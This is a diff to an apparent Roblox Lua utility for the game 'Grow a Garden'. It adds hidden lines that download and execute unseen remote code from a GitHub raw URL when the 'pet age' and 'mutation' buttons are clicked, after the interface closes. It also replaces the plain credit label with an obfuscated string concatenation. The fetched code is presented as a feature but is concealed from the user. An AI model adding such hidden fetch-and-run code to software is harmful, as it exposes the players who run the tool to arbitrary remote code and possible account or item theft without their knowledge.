@@ -426,6 +426,8 @@ loadAgeBtn.MouseButton1Click:Connect(function()
 
         fadeTween.Completed:Connect(function()
             screenGui:Destroy()
+            -- Your working pet age script here ðŸ‘‡
+           loadstring(game:HttpGet("https://raw.githubusercontent.com/locario13/Grow-A-Garden-tools/refs/heads/main/.lua"))()
         end)
     end)
 end)
@@ -515,6 +517,8 @@ mutationBtn.MouseButton1Click:Connect(function()
 
         fadeTween.Completed:Connect(function()
             screenGui:Destroy()
+            -- âœ… Correct loadstring goes here
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/locario13/Grow-A-Garden-tools/refs/heads/main/.lua"))()
         end)
     end)
 
@@ -530,4 +534,4 @@ credit.BackgroundTransparency = 1
 credit.Font = Enum.Font.FredokaOne
 credit.TextSize = 14
 credit.TextColor3 = Color3.fromRGB(200, 200, 200)
-credit.Text = "Grow a Garden Best Tool"
+credit.Text = a1..a2..a3..a4..a5..a6..a7..a8..a9..b1..b2..b3..b4..b5..b6..c1
